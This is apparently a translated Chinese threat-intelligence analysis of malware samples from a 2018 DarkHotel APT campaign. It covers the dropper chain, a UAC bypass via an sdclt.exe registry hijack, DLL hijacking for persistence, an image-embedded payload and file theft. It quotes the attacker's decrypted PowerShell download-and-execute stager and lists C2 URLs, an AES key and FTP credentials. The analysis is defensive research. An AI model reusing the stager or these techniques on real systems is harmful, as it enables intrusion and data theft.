# DarkHotel APT团伙新近活动的样本分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 背景
Darkhotel（APT-C-06）是一个长期针对企业高管、国防工业、电子工业等重要机构实施网络间谍攻击活动的APT组织。2014年11月，卡巴斯基实验室的安全专家首次发现了Darkhotel
APT组织，并声明该组织至少从2010年就已经开始活跃，目标基本锁定在韩国、中国、俄罗斯和日本。360威胁情报中心对该团伙的活动一直保持着持续跟踪，而在最近几个月我们再次跟踪到该团伙发起的新的攻击活动。
## 来源
2018年2月中旬，360威胁情报中心在对恶意代码日常跟踪的过程中发现疑似定向攻击的APT样本，通过对该样本的深入分析，利用威胁情报中心数据平台，确认其与长期跟踪的DarkHotel
APT团伙存在关联，并且结合威胁情报数据挖掘到了该团伙更多的样本，对该团伙近年来使用的多个版本的恶意代码进行了分析对比，梳理了样本演化过程。
## 样本分析
监控到的样本是一个DOC样本（letter.doc），该样本会释放的一批白利用文件，其中一个白利用文件是谷歌Chrome浏览器组件：
白利用文件释放到以下目录：
%temp%\taskhost.exe
%temp%\chrome_frame_helper.dll
taskhost.exe的签名信息：
而chrome_frame_helper.dll文件被白文件加载起来后，会从自身资源释放出一个和0xa9异或后的PowerShell脚本，再解密后执行。
加密前的PowerShell脚本：
使用0xA9异或解密后的PowerShell脚本文件如下：
将混淆后的PowerShell脚本解密后如下：
IEx($url=’http://********ents.com/melon322/search.php?name=180322-16′;$key=’Lq5846yGptowMcuLyQBcdw+vgnKl7aA0lTBUV4QkShs=’;
$wc = New-Object Net.WebClient; $wc.Headers[“User-Agent”] = “Mozi11a/4.0″;
$a=$wc.DownloadString($url);$a) ”
### Dropper
解密后的PowerShell脚本就是一个Dropper，该脚本会将UserAgent设置为Mozi11a/4.0然后去下载下一步的PowerShell脚本执行：
再次下载回来的PowerShell脚本也是经过混淆的，去混淆分析整理后的功能主要是绕过UAC后去下载msfte.dll到系统的system32目录下，下载NTWDBLIB.DLL文件到系统的system32目录下，通过cliconfg.exe白利用加载NTWDBLIB.DLL来修改msfte.dll的宿主服务WSearch成自动开启状态，实现msfte.dll的持久化驻留主要功能如下：
**Bypass UAC**
样本首先通过修改注册表HKCU:\Software\Classes\exefile\shell\runas\command的值，指向需要运行的进程路径（PowerShell），再运行sdclt.exe触发执行起来的进程以实现Bypass
UAC：
**劫持系统模块**
Bypass
UAC后的PowerShell脚本会伪装UserAgent后去下载msfte.dll和NTWDBLIB.DLL这两个文件，然后通过AES解密到%temp%目录下，密钥为’Lq5846yGptowMcuLyQBcdw+vgnKl7aA0lTBUV4QkShs=’：
使用PowerShell-Suite模块分别把temp目录下的msfte.dll和NTWDBLIB.DLL移动到system32目录下（因为当前执行的powershell的进程是bypass
uac起来的，所以可以成功移动到系统目录下）。
%windir%\System32\cliconfg.exe文件会默认加载system32目录下的NTWDBLIB.dll文件，这样通过执行cliconfg.exe来执行NTWDBLIB.DLL的代码，而该DLL的代码主要是修改Wsearch服务的状态为自动启动状态，实现msfte.dll的长久驻留系统。
**传输加密后进程列表到WEB服务器**
脚本还会将进程列表加密后传输到WEB服务器：
**上传msfte.dll文件信息**
最后将msfte.dll的文件信息加密上传，确认mstfe.dll是否修改成功：
### NTWDBLIB.dll分析
该DLL的主要作用是把WSearch服务（mstfe.dll的宿主服务）设置成自动启动状态，这样mstfe.dll会随系统启动而启动，然后重启服务，加载劫持的DLL文件：
还会检测AVG及AVAST杀软：
如果存在这两类杀软则删除自身：
生成对应自删除脚本并执行：
### msfte.dll分析
下载回来的msfte.dll成功释放到system32目录后，重启系统（随之启动WSerch服务）会默认加载这个DLL文件，实现自启动，代码中会判断是否是以下几个进程加载该DLL，如果是才会执行恶意代码：
恶意代码执行后先获取Payload的下载地址：
LoadConfig函数会先判断同目录下有没有Config.ini，如果没有，就会从自身解密出Payload的下载地址：
解密后的数据内容，该样本的payload的下载地址为：
http://******ld.com/strawberry322/config.php
http://******00.com/strawberry322/config.php
拼接出下载地址：
下载回来的文件是一个图片，附加数据在图片的后面：
正常图片和捆绑了数据的图片大小对比：
最后从图片的附加数据种解密出Payload：
解密函数中会首先校验下载数据的合法性，然后再执行解密：
最后通过异或/减获取到解密后的PE文件：
解密后的数据如下：
在内存种反射加载解密后的PE文件：
### 主功能DLL（RetroMain）分析
msfte.dll下载解密图片中的数据得到的DLL文件即为主远控DLL，该远控的主要功能逻辑除了命令处理模块外，还会启动两个线程分别用于插件安装，及信息窃取：
**字符串加密算法**
样本中使用的相关字符集函数名称都行了加密，加密的方式包含以下三类：
第一类通过一个预置的64字节的字典异或获取字符串的值，该类解密算法主要用于解密动态函数名及部分重要的字符串：
第二类加密算法为单字节异或/加减，主要用于部分重要数据结构的解密：
部分解密后的数据如下：
**启动执行插件的线程**
主控DLL启动一个线程并通过上述的第二类解密算法获取对应的插件名及插件对应的目录，插件路径为%ALLUSERSPROFILE%\GE4FH28Q，支持的插件如红框所示：
再依次判断目录下的对应插件，并加载执行：
之后获取系统相关信息，主要为系统版本及操作系统当前的相关状态信息（如路由表，进程列表等）：
fun_CollectinfoBycmd函数中通过CMD命令获取操作系统状态：
部分收集的信息如下所示：
紧接着开启第二个线程用于窃取用户数据，窃取的主要文件后缀有：
“.txt”;”.tmp”;”.dat”;”.dot”;”.rar”;
然后提交到如下URL：
http://******rld.com/strawberry322/config.php?p=H&inst=2749&name=180322-16
最后进入fun_shell_Dispatch函数，该函数通过POST的方式提交用户信息（地址：http://******rld.com/strawberry322/config.php?p=H&inst=0538&name=180322-16），并返回对应的攻击指令，且提交数据的前八个字节预留，用于校验：
singal前6位的数据通过时间和随机数相加取余获得，第7、8位为前6位和的校验值：
之后获取服务端的指令执行相应的功能，支持的功能如下：
### 插件分析
样本的主控模块（RetroMain）除了实现远程命令处理等功能以外主要以插件形式执行主要的模块功能，样本使用了多个插件，主要的插件功能如下：
相关插件的具体功能分析如下：
**Ctfmon.exe/wqstec.exe**
这两个exe为轻量级的信息收集Loader，通过执行以下CMD命令收集系统相关信息：
通过cmd.exe /c dir /x /s
/a遍历目录文件信息，获取指定后缀的文件doc，xls，txt，ppt，eml，doc，并通过WinRAR加密压缩，对应的密码为：p1q2w3e4r!@#$????1234****：
收集的信息及对应的打包文件通过FTP上传，FTP服务器IP地址：119.xx.xx.32
用户名：unknown
密码：wodehaopengyou123!@#
ctfmon_ donot.exe